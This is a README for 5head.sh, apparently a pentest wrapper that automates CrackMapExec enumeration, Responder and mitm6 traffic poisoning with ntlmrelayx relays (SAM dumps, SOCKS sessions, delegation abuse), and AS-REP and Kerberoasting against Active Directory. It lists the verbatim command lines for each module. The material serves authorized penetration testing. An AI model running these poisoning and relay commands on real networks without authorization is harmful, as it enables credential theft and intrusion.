<p align="center">
  <img src="https://user-images.githubusercontent.com/51839088/177005677-e86231f7-1843-47f8-a58d-3fb59bade7ca.png">
</p>

# 5head.sh
5head.sh is a wrapper of a series of common network penetration testing toolsets within a portable and modular scripting platform that quickly allows network penetration testers to perform repeatable tasks. This aims to allow an operator to spend less time on boring stuff and more time on exploring discovered attack paths.

The [tmux](https://github.com/tmux/tmux/wiki) terminal multiplexer is heavily utilized for job management, with a BYOT.conf (Bring-Your-Own-Tmux.conf) mindset.

Development and testing was performed within a fresh install of Kali Linux to simulate the broadest use case. It has not been tested on alternate *NIX platforms.

This repo also contains a `setup.sh` installation script, which will configure the neccessary copies of tools needed for 5head.sh's modules. This allows operators to still utilize alternate versions/forks of tooling that will not conflict with the copies used by 5head.sh.

Thanks to the following people/projects that are contained within this wrapper:
- https://github.com/Porchetta-Industries/CrackMapExec ([@byt3bl33d3r](https://twitter.com/byt3bl33d3r)/[@mpgn_x64](https://twitter.com/mpgn_x64))
  -  PrintSpooler research from the SpectreOps crew ([@tifkin_](https://twitter.com/tifkin_) (Lee Christensen), [@harmj0y](https://twitter.com/harmj0y) (Will Schroeder), [@enigma0x3](https://twitter.com/enigma0x3) (Matt Nelson)
  -  PetitPotam research ([@topotam](https://twitter.com/topotam77))
  -  ShadowCoerce research [@topotam](https://twitter.com/topotam77) + implementation ([Charlie Bromberg](https://twitter.com/_nwodtuhs))
  -  DFSCoerce research ([@filip_dragovic](https://twitter.com/filip_dragovic))
- https://github.com/SecureAuthCorp/impacket ([@SecureAuth](https://twitter.com/SecureAuth))
- https://github.com/dirkjanm/mitm6 ([@_dirkjan](https://twitter.com/_dirkjan))
- https://github.com/lgandx/Responder ([Laurent Gaffié](https://g-laurent.blogspot.com/))
- https://github.com/zyn3rgy/LdapRelayScan ([@zyn3rgy](https://twitter.com/zyn3rgy))
- https://github.com/fox-it/BloodHound.py (also [@_dirkjan](https://twitter.com/_dirkjan))

## Installation
To begin installation of 5head.sh, clone the repo and ensure the scripts are executable:
```bash
git clone https://github.com/Renegade-Labs/5head.sh
cd 5head.sh
chmod +x 5head.sh setup.sh
```
Next you will need to run `setup.sh` as root:
```python
┌──(root💀kali)-[/home/kali/working/5head.sh]
└─# ./setup.sh                                                          
[*] Logging verbose install output in install.log...
[*] Installing package dependencies...
[+] Packages installed
[*] Creating dependency directory...
[+] Dependency directory created
[*] Creating loot directory...
[+] Loot directory created
[*] Grabbing CME...
[+] CME downloaded
[*] Grabbing lgandx fork of Responder...
[+] Responder downloaded
[*] Setting Responder.conf settings...
[+] Responder.conf configured
[*] Installing Impacket...
[+] Impacket installed
[*] Installing mitm6...
[+] mitm6 installed
[*] Installing LdapRelayScan...
[+] LdapRelayScan installed
[*] Installing bloodhound-python...
[+] bloodhound-python installed
[+] Installation complete!
```

Now simply run `./5head.sh`
```
    ____                                  __        __          __
   / __ \___  ____  ___  ____ _____ _____/ /__     / /   ____ _/ /_  _____
  / /_/ / _ \/ __ \/ _ \/ __ `/ __ `/ __  / _ \   / /   / __ `/ __ \/ ___/
 / _, _/  __/ / / /  __/ /_/ / /_/ / /_/ /  __/  / /___/ /_/ / /_/ (__  )
/_/ |_|\___/_/ /_/\___/\__, /\__,_/\__,_/\___/  /_____/\__,_/_.___/____/
                      /____/
[*] Starting 5head.sh...

~ 5head.sh ~
1) Enum
2) Poison
3) AD
0) Detach tmux
Choose a module:
```

## Usage
```python
$ ./5head.sh -h

        5head.sh usage: [-h] [-t targetfile] [-i interface] [-d domain] [-c domain controller] [-u username] [-p password] [-h help]

        mandatory arguments:
          -t TARGETFILE          Newline-delimmited list of targets. Accepts CIDRs or ranges (192.168.0.1-255)
          -i INTERFACE           Interface to use for network traffic

        useful arguments:
          -d  DOMAIN             Specific domain to perform authentication attempts on
          -c  DOMAIN CONTROLLER  Domain controller (IP/FQDN) to use for checks
          -u  USERNAME           Username to use for authentication
          -p  PASSWORD           Password to use for authentication

        optional arguments:
          -h                     Print this help menu
```

### Recommended Usage
It is heavily recommended to supply the following arguments to 5head.sh:
- `-d DOMAIN`
- `-c DOMAIN CONTOLLER`
- `-u USERNAME`
- `-p PASSWORD`

If these are not supplied, the toolset will prompt for you to provide them when neccessary. Without credentials much of the functionality will not work.

For `-c DOMAIN CONTOLLER` it is recommended to utilize the FQDN of the domain contoller you would like to target. This will require `/etc/resolv.conf` to be configured with a working DNS server (often times the same domain contoller).

## Modules
Functionality within 5head.sh is currentlly broken into three "modules", each containing a series of automated tasks. This is likely to change as more functionality is added in the future.

### Enum
#### Packet capture
Uses `tcpdump` to perform a packet capture on the interface specified when running 5head.sh initially.

Output is written to `loot/packet_capture.pcap`.

Verbose command:
```
tcpdump -i $interface -w loot/packet_capture.pcap
```

#### SMB enumeration + target generation (CME)
Enumerates the target list specified with `-t` using CrackMapExec + SMB. This list is heavily utilized throughout the other modules.

Output is written to `loot/cme_enum_smb.txt`.

Verbose command:
```python
deps/cme smb $targets >> loot/cme_enum_smb.txt
```

#### LDAP enumeration + target generation (CME)
Enumerates the target list specified with `-t` using CrackMapExec + SMB. This list is heavily utilized throughout the other modules.

Output is written to `loot/cme_enum_ldap.txt`.

Verbose command:
```python
deps/cme ldap $targets >> loot/cme_enum_ldap.txt
```

#### MSSQL enumeration + target genertaion (CME)
Enumerates the target list specified with `-t` using CrackMapExec + MSSQL. 

Output is written to `loot/cme_enum_mssql.txt`.

Verbose command:
```python
deps/cme mssql $targets >> loot/cme_enum_mssql.txt
```

### Poison
#### Generate target lists from CME output
Generates the following target lists to be used for traffic poisoning:
- `loot/smb_targets.txt`
- `loot/ldap_targets.txt`
- `loot/mssql_targets.txt`
- `loot/multi_targets.txt`

This works by filtering output from each CME enumeration module based on the domain environment variable. This ensures that hosts that are not domain-joined do not receieve authentication attempts from modules.

Verbose commands:
```bash
grep -F -- "$domain" loot/cme_enum_smb.txt | grep 'signing:False' | cut -d " " -f 10 > loot/smb_targets.txt
grep -F -- "$domain" loot/cme_enum_ldap.txt | cut -d " " -f 10 > loot/ldap_targets.txt
grep -F -- "$domain" loot/cme_enum_mssql.txt | cut -d " " -f 10 > loot/mssql_targets.txt
sed 's/^/smb:\/\//g' loot/smb_targets.txt >> loot/multi_targets.txt
sed 's/^/ldap:\/\//g' loot/ldap_targets.txt >> loot/multi_targets.txt
sed 's/^/mssql:\/\//g' loot/mssql_targets.txt >> loot/multi_targets.txt
```

#### SMB: Responder + ntlmrelayx (SAM dump)
Utilizes Responder for LLMNT/NBT-NS/MDNS traffic poisoning and ntlmrelayx to relay it to hosts without SMB signing. If the relayed authentication possesses administrative access it will attempt to dump the contents of the SAM database on the remote host.

Can be run against a single host or a list of targets defined in `loot/smb_targets.txt`

Verbose commands:
```python3
python3 deps/Responder/Responder.py -I ${interface} --lm --disable-ess -w
ntlmrelayx.py -t ${solo_target} -smb2support
```

#### SMB: Responder + ntlmrelayx (socks)
Utilizes Responder for LLMNR/NBT-NS/MDNS traffic poisoning and ntlmrelayx to authenticate to target hosts and establish a session that can be used over a SOCKS proxy.

Can be run against a single host or a list of targets defined in `loot/smb_targets.txt`.

Verbose commands:
```python
python3 deps/Responder/Responder.py -I ${interface} --lm --disable-ess -w
ntlmrelayx.py -tf/-t <target file or single target> -smb2support -socks
```

#### LDAP: Responder + ntlmrelayx (socks)
Utilizes Responder for LLMNR/NBT-NS/MDNS traffic poisoning and ntlmrelayx to authenticate to target hosts and establish a session that can be used over a SOCKS proxy.
  
Can be run against a single host or a list of targets defined in `loot/ldap_targets.txt`.

Verbose commands:
```python
python3 deps/Responder/Responder.py -I ${interface} --lm --disable-ess -w
ntlmrelayx.py -tf/-t <target file or single target> -smb2support -socks -wh fake-wpad
```

#### LDAP: Responder + ntlmrelayx (delegate access)
Utilizes Responder for LLMNR/NBT-NS/MDNS traffic poisoning and ntlmrelayx to create a machine account with delegation rights.

Can be run against a single host or a list of targets defined in `loot/ldap_targets.txt`.

Verbose commands:
```python
python3 deps/Responder/Responder.py -I ${interface} --lm --disable-ess -w
ntlmrelayx.py -tf/-t <target file or single target> -smb2support --delegate-access -wh fake-wpad
```

#### NOT IMPLEMENTED: MSSQL: Responder + ntlmrelayx
TODO

#### >NOT IMPLEMENTED: MULTI: Responder + ntlmrelayx
TODO

#### LDAP: mitm6 + ntlmrelayx (socks)
Utilizes mitm6 for DHCPv6 traffic poisoning and ntlmrelayx to create relay coerced HTTP traffic to remote LDAP service(s) and establish a session that can be used over a SOCKS proxy.

Can be run against a single host or a list of targets defined in `loot/ldap_targets.txt`.

Verbose commands:
```python
mitm6 -d ${domain} -i ${interface} --ignore-nofqdn
ntlmrelayx.py -tf/-t <target file or single target> -smb2support -socks -wh fake-wpad
```

#### LDAP: mitm6 + ntlmrelayx (delegate access)
Utilizes mitm6 for DHCPv6 traffic poisoning and ntlmrelayx to create a machine account with delegation rights.

Can be run against a single host or a list of targets defined in `loot/ldap_targets.txt`.

Verbose commands:
```python
mitm6 -d ${domain} -i ${interface} --ignore-nofqdn
ntlmrelayx.py -tf/-t <target file or single target> -smb2support --delegate-access -wh fake-wpad
```

### AD
All AD modules require the `username (-u)`, `password (-p)`, `domain (-d)`, and `domain controller (-c)` arguments to be set.

#### Search for ASREPRoastable users
Utilizes Impacket's GetNPUsers.py script to search for ASREPRoastable users and request a TGT.

Requested tickets are written to `loot/asrep.txt`.  

Verbose command:
```python
GetNPUsers.py -outputfile loot/asrep.txt -ts -request -dc-ip $dc $domain/$username:$password
```

#### Search for Kerberoastable users
Utilizes Impacket's GetUserSPNs.py script to search for Kerberoastable users and request a service ticket (ST).

Requested tickets are written to `loot/kerberoast.txt`.

Verbose command:
```python
GetUserSPNs.py -outputfile loot/kerberoast.txt -dc-ip $dc $domain/$username:$password
```

#### Enumerate shares on domain hosts
Searches domain-joined hosts for their share's using CrackMapExec's `--shares` flag.

Output is written to `loot/share_enum.txt`.

Verbose command:
```python
deps/cme smb loot/domain_targets.txt -u ${username} -p ${password} -d ${domain} >> loot/share_enum_all.txt
```

#### Search for ADCS targets
Uses CrackMapExec's `ADCS` module to enumerate the Active Directory Certificate Services information within a domain.

Verbose command:
```python
deps/cme ldap $dc -u $username -p $password -d $domain -M adcs
```

#### Python Bloodhound ingestor Note: YMMV
Attempts to utilize Dirk-jan's Python bloodhound ingestor to generate graph data for BloodHound. Heavily dependant on the environment you are in, so it might not work perfectly every time.
 
Verbose command:
```python
bloodhound-python -c all -u ${username} -p ${password} -ns ${dc}
```    

#### NOT IMPLEMENTED: Enumerate host for authentication coercion mechanisms
TO-DO: Write a wrapper that will check each domain-jonied host for:
- PetitPotam
- Print Spooler
- ShadowCoerce (VSS service is weird)
- DFSCoerce

#### Check LDAP Signing and Channel Binding
This module wraps [LdapRelayScan.py](https://github.com/zyn3rgy/LdapRelayScan) to test a domain controller for LDAP signing and channel binding.

Verbose command:
```python 
python3 deps/LdapRelayScan/LdapRelayScan.py -method BOTH -dc-ip ${dc} -u ${username} -p ${password} 
``` 

#### Check Machine-Account-Quota
Uses CrackMapExec's `MAQ` module to enumerate the Machine-Account-Quota setting within a domain.

Verbose command:
```python
deps/cme ldap $dc -u $username -p $password -d $domain -M maq
```

## Future Plans
Let us know if there are pieces of functionality you would find useful in the tool. These can typically easily be implemented and added. PRs are welcome.

Also, my DMs are open on [Twitter](https://twitter.com/_bin_Ash) 😉 

Currently the following objectives are being pursued for the script:
- ntlmrelayx.py multi-relay functionality (need testing)
- ntlmrelayx.py mssql relay functionality (need testing)
- global logging capabilities
- authentication coercion checking per-host (ShadowCoerce, PetitPotam, Print Spooler, DFSCoerce)
- More ADCS functionality

## Support
5head.sh heavily utilizes CrackMapExec for much of the activity it performs. If you are feeling generous please support CrackMapExec and other open-source security tools through a subscription to [Porchetta Industries](https://porchetta.industries/).

## Release Log
- `xx/xx/xxxx` - Version 1.0 released
